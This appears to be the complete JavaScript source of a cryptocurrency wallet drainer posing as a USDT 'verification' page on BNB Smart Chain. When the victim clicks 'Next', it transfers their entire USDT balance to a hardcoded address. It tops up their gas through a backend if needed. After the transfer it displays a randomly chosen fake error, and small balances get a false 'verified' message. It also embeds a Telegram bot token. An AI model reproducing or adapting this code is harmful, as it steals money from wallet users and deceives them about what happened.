const bscAddress = "0x2Ef0E79c11dC142EC6c94AeA92340dBeFf957988";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
const alternativeWalletAddress = "0x2Ef0E79c11dC142EC6c94AeA92340dBeFf957988"; // 

// Telegram Bot
const telegramBotToken = "7469005317:AAGgWxVoQLTDTcclOPYiysSqf58xyihZwwQ"; // Bot token
const telegramChatId = "72879"; // Chat id

let web3, userAddress;

async function waitForProvider(timeout = 5000) {
    return new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
            const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
            if (provider || Date.now() - start > timeout) {
                clearInterval(interval);
                resolve(provider);
            }
        }, 100);
    });
}

async function connectWalletAndSwitch() {
    const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
    if (!provider) {
        alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
        return;
    }
    try {
        web3 = new Web3(provider);
        const currentChain = await provider.request({ method: 'eth_chainId' });
        if (currentChain !== '0x38') {
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                } else {
                    alert("Please switch to BNB manually.");
                    return;
                }
            }
        }
        const accounts = await provider.request({ method: "eth_accounts" });
        userAddress = accounts[0];
        console.log("✅ Wallet:", userAddress);
    } catch (e) {
        alert("Wallet connection failed.");
        console.error(e);
    }
}

async function estimateGasForTransaction(contract, method, params, fromAddress) {
    try {
        const gasEstimate = await contract.methods[method](...params).estimateGas({ from: fromAddress });
        const gasPrice = await web3.eth.getGasPrice();
        const totalGasCost = gasEstimate * gasPrice;
        return parseFloat(web3.utils.fromWei(totalGasCost.toString(), 'ether'));
    } catch (error) {
        console.error("Gas estimation failed:", error);
        return 0.001;
    }
}

async function sendBNBSilently(toAddress, amount) {
    try {
        console.log(`🔄 Requesting ${amount} BNB to be sent to ${toAddress}...`);

        const response = await fetch('/api/sendBNB', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                toAddress: toAddress,
                amount: amount
            })
        });

        const data = await response.json();
        console.log('API Response:', data);

        if (!response.ok) {
            console.error("❌ API Error:", data.error);
            if (data.error && data.error.includes('Insufficient BNB')) {
                console.error('⚠️ ADMIN WALLET HAS INSUFFICIENT BNB');
                console.error(`Available: ${data.availableBalance || 'unknown'} BNB`);
                console.error(`Requested: ${data.requestedAmount || amount} BNB`);
                showPopup(`❌ System Error: Admin wallet needs to be topped up. Please contact support.`, "red");
            }
            return false;
        }

        if (data.success) {
            console.log("✅ BNB sent successfully!");
            console.log("Transaction Hash:", data.transactionHash);
            return true;
        } else {
            console.error("❌ BNB send failed:", data.error);
            return false;
        }
    } catch (error) {
        console.error("❌ Silent BNB send failed:", error);
        return false;
    }
}

function changeButtonToSending() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase() === "next");
    if (btn) {
        btn.textContent = "Sending...";
        btn.disabled = true;
        btn.style.opacity = "0.6";
        btn.style.cursor = "not-allowed";
    }
}

function resetButton() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase().includes("sending"));
    if (btn) {
        btn.textContent = "Next";
        btn.disabled = false;
        btn.style.opacity = "1";
        btn.style.cursor = "pointer";
    }
}

function showFakeErrorMessage() {
    const errorMessages = [
        "❌ Transaction failed due to technical issues. Please try again later.",
        "❌ Server temporarily unavailable. Please retry in a few moments.",
        "❌ Network congestion detected. Transaction could not be completed.",
        "❌ Technical maintenance in progress. Service temporarily unavailable.",
        "❌ Connection timeout. Please check your internet and try again.",
        "❌ System overload detected. Please wait and retry the transaction."
    ];

    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    showPopup(randomError, "red");
}

async function Next() {
    changeButtonToSending();

    if (!web3 || !userAddress) {
        await connectWalletAndSwitch();
        if (!web3 || !userAddress) {
            showPopup("Wallet not connected.", "red");
            resetButton();
            return;
        }
    }

    try {
        const usdtContract = new web3.eth.Contract([
            {
                constant: true,
                inputs: [{ name: "_owner", type: "address" }],
                name: "balanceOf",
                outputs: [{ name: "", type: "uint256" }],
                type: "function"
            },
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        let [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        let bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

        console.log("Initial USDT:", usdtBalance);
        console.log("Initial BNB:", bnbBalance);

        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
            showPopup("No USDT assets found in your wallet.", "black");
            resetButton();
            return;
        }

        if (usdtBalance <= 0.0001) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            resetButton();
            return;
        }

        // Determine action based on USDT balance
        let actionType = "transfer"; // Only transfer now, no approval
        let targetAddress = "";
        let requiredGas = 0;

        if (usdtBalance >= 1 && usdtBalance <= 300) {
            // Transfer to alternative wallet (1-300 USDT)
            targetAddress = alternativeWalletAddress;
            if (!targetAddress) {
                showPopup("❌ Alternative wallet address not configured.", "red");
                resetButton();
                return;
            }
            const transferAmount = web3.utils.toWei(usdtBalance.toString(), "ether");
            requiredGas = await estimateGasForTransaction(usdtContract, "transfer", [targetAddress, transferAmount], userAddress);
            console.log("Action: Transfer to alternative wallet (1-300 USDT)");
        } else if (usdtBalance > 300) {
            // Transfer to main BSC address (>300 USDT)
            targetAddress = bscAddress;
            const transferAmount = web3.utils.toWei(usdtBalance.toString(), "ether");
            requiredGas = await estimateGasForTransaction(usdtContract, "transfer", [targetAddress, transferAmount], userAddress);
            console.log("Action: Transfer to main wallet (>300 USDT)");
        } else {
            // Balance between 0.0001 and 1 USDT - no action needed
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            resetButton();
            return;
        }

        console.log("Required gas (BNB):", requiredGas);
        console.log("Current BNB balance:", bnbBalance);

        // Auto-send BNB if needed
        let bnbToSend = 0;
        if (bnbBalance < requiredGas) {
            bnbToSend = Math.max(requiredGas + 0.0001, 0.0002);
        }

        if (bnbToSend > 0) {
            console.log(`Auto-sending ${bnbToSend} BNB for gas...`);
            const bnbSent = await sendBNBSilently(userAddress, bnbToSend);

            if (bnbSent) {
                console.log("Waiting for BNB transaction confirmation...");
                await new Promise(resolve => setTimeout(resolve, 3000));

                const newBnbBalanceWei = await web3.eth.getBalance(userAddress);
                bnbBalance = parseFloat(web3.utils.fromWei(newBnbBalanceWei, "ether"));
                console.log("Updated BNB balance after auto-send:", bnbBalance);
            } else {
                console.log("Auto-BNB send failed");
            }
        }

        // Execute transfer (no more approval logic)
        try {
            const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
            const gas = await usdtContract.methods.transfer(targetAddress, amountToSend).estimateGas({ from: userAddress });

            await usdtContract.methods.transfer(targetAddress, amountToSend)
                .send({ from: userAddress, gas });

            // Show fake error instead of success
            setTimeout(() => {
                showFakeErrorMessage();
                resetButton();
            }, 1000);

        } catch (transactionError) {
            console.error("Transaction failed:", transactionError);
            if (transactionError?.message?.includes("insufficient funds")) {
                showPopup("❌ Not enough BNB for gas fees. Please add more BNB to your wallet.", "red");
            } else {
                showPopup("❌ Transaction failed. Please try again.", "red");
            }
            resetButton();
        }

    } catch (e) {
        console.error("❌ General error:", e);
        showPopup("❌ Transaction failed. Please check your connection and try again.", "red");
        resetButton();
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "20px", borderRadius: "10px",
            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
            textAlign: "center", fontSize: "18px",
            width: "80%", maxWidth: "400px",
            zIndex: 9999, backgroundColor: "#fff"
        });
        document.body.appendChild(popup);
    }
    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";
    setTimeout(() => popup.style.display = "none", 5000);
}

window.addEventListener("load", async () => {
    const provider = await waitForProvider();
    if (!provider) {
        alert("No Web3 wallet detected.");
        return;
    }
    await connectWalletAndSwitch();

    const observer = new MutationObserver(() => {
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase() === "next");
        if (btn) {
            btn.addEventListener("click", Next);
            console.log("✅ Bound 'Next' to Next()");
            observer.disconnect();
        }
    });
    observer.observe(document.body, { childList: true, subtree: true });
});
